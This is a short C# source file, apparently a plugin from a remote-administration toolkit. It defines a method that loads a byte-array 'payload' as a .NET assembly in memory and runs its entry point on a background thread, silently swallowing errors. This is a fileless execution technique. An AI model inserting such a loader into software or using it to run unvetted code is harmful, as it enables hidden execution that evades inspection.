using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class ManagedExe
    {
        internal static bool LoadExe(byte[] payload)
        {
            Thread thread = new Thread(() =>
            {
                try
                {
                    System.Reflection.Assembly a = System.Reflection.Assembly.Load(payload);
                    System.Reflection.MethodInfo m = a.EntryPoint;
                    var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] { } };
                    m.Invoke(null, parameters);
                }
                catch { }

            });
            thread.Start();

            if (thread.IsAlive)
                return true;
            return false;
        }
    }
}
